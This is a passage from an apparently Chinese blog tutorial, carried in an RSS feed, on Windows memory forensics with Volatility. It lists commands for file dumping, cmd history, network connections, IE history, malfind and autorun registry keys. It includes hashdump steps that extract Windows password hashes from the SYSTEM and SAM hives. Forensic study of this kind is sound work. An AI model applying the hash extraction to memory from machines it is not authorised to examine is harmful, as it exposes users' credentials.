&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x07f1b6c10 --dump-dir=./&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201203174024646.png&#34; alt=&#34;image-20201203174024646&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201203174048410.png&#34; alt=&#34;image-20201203174048410&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取内存中保留的cmd命令使用情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取内存中保留的cmd命令使用情况&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取内存中保留的 cmd 命令使用情况&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 cmdline&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102151626278.png&#34; alt=&#34;image-20201102151626278&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取出内存中记录的-当时正在运行的程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取出内存中记录的-当时正在运行的程序&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取出内存中记录的 当时正在运行的程序&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.vmem --profile=Win7SP1x64 userassist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102152650474.png&#34; alt=&#34;image-20201102152650474&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;提取网络连接情况&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取网络连接情况&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取网络连接情况&lt;/strong&gt;&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 netscan&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102153001736.png&#34; alt=&#34;image-20201102153001736&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取ie浏览器历史&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取ie浏览器历史&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取 IE 浏览器历史&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 iehistory&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;提取系统密码hashdump&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取系统密码hashdump&#34;&gt;#&lt;/a&gt; &lt;strong&gt;提取系统密码&lt;/strong&gt;（hashdump）&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;直接 hashdump&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 hashdump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102154219862.png&#34; alt=&#34;image-20201102154219862&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;注册表 system 的 virtual 地址&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SAM 的 virtual 地址&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102153454213.png&#34; alt=&#34;image-20201102153454213&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dump 出来密码&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.vmem --profile=Win7SP1x64 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.vmen --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000867010&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20201102153714379.png&#34; alt=&#34;image-20201102153714379&#34;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取迁移后的进程编号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取迁移后的进程编号&#34;&gt;#&lt;/a&gt; 提取迁移后的进程编号&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 malfind -p&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;提取开机自启项的virtual地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提取开机自启项的virtual地址&#34;&gt;#&lt;/a&gt; 提取开机自启项的 Virtual 地址&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 printkey -K &amp;quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;volatility -f mem.raw --profile=Win7SP1x64 printkey -K &amp;quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
    </channel>
</rss>
